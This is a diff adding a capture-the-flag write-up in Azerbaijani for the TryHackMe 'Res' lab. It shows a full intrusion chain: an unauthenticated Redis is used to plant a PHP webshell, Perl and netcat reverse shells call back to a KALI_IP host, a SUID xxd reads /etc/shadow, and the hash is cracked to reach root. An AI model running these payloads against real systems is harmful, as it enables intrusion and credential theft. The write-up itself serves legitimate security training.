@@ -1,0 +1,288 @@
+# TryHackMe — Res Writeup (Azərbaycanca)
+
+> **Çətinlik:** Asan (Easy)  
+> **Kateqoriya:** Redis, RCE, Webshell, SUID, Hash Cracking  
+> **Link:** https://tryhackme.com/room/res
+
+---
+
+## Mündəricat
+
+1. [Kəşfiyyat — Nmap Skanı](#kəşfiyyat)
+2. [Redis — Məlumat Toplama](#redis)
+3. [PHP Webshell — Redis Fayl Yazma](#php-webshell)
+4. [Reverse Shell](#reverse-shell)
+5. [Privilege Escalation — xxd SUID](#privilege-escalation)
+6. [Hash Crack — Vianka Şifrəsi](#hash-crack)
+7. [Root Flag](#root-flag)
+8. [Cavablar Xülasəsi](#cavablar-xülasəsi)
+
+---
+
+## Kəşfiyyat
+
+Tam port skanı işlədirik:
+
+```bash
+nmap -sC -sV -p- TARGET_IP
+```
+
+**Nəticə:**
+
+```
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Apache httpd 2.4.41
+6379/tcp open  redis   Redis key-value store 6.0.7
+```
+
+**Açıq portlar:**
+- `80` — Apache HTTP server
+- `6379` — Redis 6.0.7 (**şifrəsiz**)
+
+> 💡 Redis-in şifrəsiz olması kritik zəiflikdir — istənilən kəs qoşula bilər!
+
+---
+
+## Redis
+
+Redis-ə birbaşa qoşuluruq:
+
+```bash
+redis-cli -h TARGET_IP
+```
+
+Əsas məlumatları toplayırıq:
+
+```bash
+info server
+```
+
+**Nəticə:**
+```
+redis_version:6.0.7
+os:Linux 5.15.0 x86_64
+executable:/home/vianka/redis-stable/src/redis-server
+config_file:/home/vianka/redis-stable/redis.conf
+```
+
+> 🔑 **Tapıntı:** Redis `vianka` istifadəçisi tərəfindən işlədir, ev qovluğu `/home/vianka`
+
+```bash
+keys *          # boşdur
+config get dir  # "/" — root qovluğu
+```
+
+---
+
+## PHP Webshell
+
+Redis-in ən güclü xüsusiyyəti — **konfiqurasiya vasitəsilə serverə fayl yaza bilir.**
+
+Port 80-də Apache var → `/var/www/html`-ə PHP webshell yazacağıq:
+
+```bash
+# Köhnə məlumatları sil
+redis-cli -h TARGET_IP flushall
+
+# PHP webshell kodunu Redis-ə açar kimi yaz
+redis-cli -h TARGET_IP set pwn '<?php system($_GET["cmd"]); ?>'
+
+# Yazılacaq qovluğu Apache-nin qovluğuna dəyiş
+redis-cli -h TARGET_IP config set dir /var/www/html
+
+# Faylın adını shell.php et
+redis-cli -h TARGET_IP config set dbfilename shell.php
+
+# Redis öz məlumat bazasını həmin fayla yaz
+redis-cli -h TARGET_IP save
+```
+
+**RCE test:**
+
+```bash
+curl "http://TARGET_IP/shell.php?cmd=id" --output -
+```
+
+**Nəticə:**
+```
+...uid=33(www-data) gid=33(www-data) groups=33(www-data)...
+```
+
+> ✅ **RCE əldə edildi!** `www-data` kimi kod icra edirik.
+
+---
+
+## Reverse Shell
+
+**Dinləyici aç:**
+
+```bash
+nc -lvnp 4444
+```
+
+**Reverse shell göndər:**
+
+```bash
+# Perl ilə
+curl -G "http://TARGET_IP/shell.php" \
+  --data-urlencode "cmd=perl -e 'use Socket;\$i=\"KALI_IP\";\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" \
+  --output -
+```
+
+**Və ya mkfifo ilə:**
+
+```bash
+curl -G "http://TARGET_IP/shell.php" \
+  --data-urlencode "cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc KALI_IP 4444 >/tmp/f" \
+  --output -
+```
+
+Shell gəldikdən sonra TTY əldə et:
+
+```bash
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+Ctrl+Z
+stty raw -echo; fg
+```
+
+---
+
+## Privilege Escalation
+
+### SUID Faylları Yoxla
+
+```bash
+find / -perm -4000 -type f 2>/dev/null
+```
+
+**Nəticə:**
+```
+/usr/bin/xxd   ← kritik!
+```
+
+`xxd` — hex editor proqramıdır. SUID biti olduqda **istənilən faylı root kimi oxuya bilir** — hətta `/etc/shadow` kimi icazəsiz faylları da!
+
+### /etc/shadow Oxu
+
+```bash
+xxd /etc/shadow | xxd -r
+```
+
+**Nəticə:**
+```
+vianka:$6$2p.tSTds$qWQfsXwXOAxGJUBuq2RFXqlKiql3jxlwEWZP6CWXm7kIbzR6WzlxHR.UHmi.hc1/TuUOUBo/jWQaQtGSXwvri0:18507:0:99999:7:::
+```
+
+> 🔑 **Vianka-nın SHA-512 hash-i tapıldı!**
+
+---
+
+## Hash Crack
+
+Hash-i fayla yazıb crack edirik:
+
+```bash
+# Hash-i fayla yaz
+echo '$6$2p.tSTds$qWQfsXwXOAxGJUBuq2RFXqlKiql3jxlwEWZP6CWXm7kIbzR6WzlxHR.UHmi.hc1/TuUOUBo/jWQaQtGSXwvri0' > hash.txt
+
+# Hashcat ilə crack et (SHA-512 = -m 1800)
+hashcat -a 0 -m 1800 hash.txt /usr/share/wordlists/rockyou.txt
+
+# Və ya John ilə
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+**Nəticə:**
+```
+password123    (vianka)
+```
+
+### Vianka-ya Keç
+
+```bash
+su vianka
+# şifrəni daxil et
+```
+
+### Root Al
+
+```bash
+sudo su
+id
+# uid=0(root)
+```
+
+---
+
+## Root Flag
+
+```bash
+cat /root/root.txt
+```
+
+```bash
+# User flag
+cat /home/vianka/user.txt
+```
+
+---
+
+## Cavablar Xülasəsi
+
+| Sual | Cavab |
+|------|-------|
+| Redis portu? | `6379` |
+| Apache portu? | `80` |
+| Redis versiyası? | `6.0.7` |
+| Webshell faylı? | `shell.php` |
+| SUID binary? | `/usr/bin/xxd` |
+| Hash növü? | `SHA-512` |
+
+---
+
+## İstifadə Edilən Alətlər
+
+| Alət | Məqsəd |
+|------|--------|
+| `nmap` | Port və servis skanı |
+| `redis-cli` | Redis-ə qoşulmaq və fayl yazmaq |
+| `curl` | RCE test və reverse shell |
+| `nc (netcat)` | Reverse shell dinləyici |
+| `xxd` | SUID ilə `/etc/shadow` oxumaq |
+| `hashcat / john` | SHA-512 hash crack |
+
+---
+
+## Hücum Zənciri
+
+```
+Nmap → Redis 6379 (şifrəsiz)
+  → Redis config ilə /var/www/html-ə shell.php yaz
+    → Apache shell.php-i PHP kimi icra edir
+      → RCE → Reverse Shell (www-data)
+        → SUID xxd ilə /etc/shadow oxu
+          → SHA-512 hash → hashcat → şifrə
+            → su vianka → sudo su → ROOT!
+```
+
+---
+
+## Texniki İzahat — Redis Fayl Yazma
+
+Redis öz məlumat bazasını `.rdb` formatında saxlayır. Bu format içində açar-dəyər cütlərini saxlayır. Biz PHP kodunu dəyər kimi yazıb, Redis-i `/var/www/html/shell.php` faylına save etdirdik. Apache həmin faylı PHP kimi işlətdi — nəticədə RCE!
+
+```
+Redis key "pwn" = "<?php system($_GET['cmd']); ?>"
+        ↓
+config set dir /var/www/html
+config set dbfilename shell.php
+save
+        ↓
+/var/www/html/shell.php yarandı
+        ↓
+http://TARGET/shell.php?cmd=id → RCE!
+```
+
+---
+
+*Writeup: TryHackMe Res — Redis RCE + xxd SUID Privilege Escalation*
